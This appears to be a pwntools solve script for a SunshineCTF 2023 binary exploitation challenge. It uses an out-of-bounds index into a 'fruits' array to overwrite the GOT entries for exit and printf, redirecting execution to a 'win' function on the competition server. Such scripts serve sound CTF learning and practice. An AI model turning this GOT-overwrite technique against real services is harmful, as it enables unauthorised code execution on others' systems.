from pwn import *

binary = 'sunshine'
#context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)

gs = '''
continue
'''
def start():
    return remote('chal.2023.sunshinectf.games', 23003)
    #if args.GDB:
    #    return gdb.debug(e.path, gdbscript=gs)
    #else:
    #    return process(e.path)


log.info("Location of fruits[]: 0x%x" %e.sym['fruits'])
log.info("Location of got['exit']: 0x%x" %e.got['exit'])
log.info("Distance: %i" %((e.got['exit']-e.sym['fruits'])/8))

p = start()
p.recvuntil(b'[0-3]')
p.sendline(b"%i" %((e.got['exit']-e.sym['fruits'])/8))
p.recvuntil(b'>>>')
p.sendline(p64(e.sym['win']))

p.recvuntil(b'[0-3]')
p.sendline(b"%i" %((e.got['printf']-e.sym['fruits'])/8))
p.recvuntil(b'>>>')
p.sendline(p64(0xdeadbeef))

p.interactive()
